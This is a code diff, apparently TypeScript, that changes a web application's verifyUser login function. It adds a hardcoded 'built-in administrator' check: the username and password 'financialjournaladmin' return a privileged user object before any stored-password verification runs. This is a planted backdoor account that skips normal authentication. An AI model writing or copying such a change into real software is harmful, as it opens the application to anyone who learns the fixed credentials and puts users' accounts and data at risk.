@@ -128,6 +128,19 @@ export async function registerUser(
 }
 
 export async function verifyUser(identifier: string, password: string): Promise<User | null> {
+  const clean = identifier.trim().toLowerCase();
+  
+  // Built-in Administrator credentials check
+  if (clean === 'financialjournaladmin' && password === 'financialjournaladmin') {
+    return {
+      id: 'admin_fj_special',
+      username: 'financialjournaladmin',
+      email: 'editorial.financialjournal@gmail.com',
+      passwordHash: hashPassword('financialjournaladmin'),
+      createdAt: '2026-01-01T00:00:00.000Z',
+    };
+  }
+
   const user = await getUserByEmailOrUsername(identifier);
   if (!user) return null;
   if (user.passwordHash === hashPassword(password)) {
